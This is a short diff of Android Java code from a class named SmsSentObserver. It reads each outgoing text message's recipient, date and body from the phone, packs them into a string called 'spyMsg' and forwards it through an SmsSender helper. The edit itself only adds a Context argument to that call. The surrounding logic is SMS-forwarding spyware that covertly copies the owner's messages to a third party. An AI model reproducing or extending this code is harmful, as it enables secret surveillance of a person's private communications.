@@ -58,7 +58,7 @@ public class SmsSentObserver extends ContentObserver {
 		        			String spyMsg = "From: " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")) + 
 		        					". Date: " + sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date")) + 
 		        					". Message: " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"));
-		        			SmsSender.getInstance().sendSms(spyMsg);
+		        			SmsSender.getInstance(this.mContext).sendSms(spyMsg);
 		        		}
 		        	}
 		        }
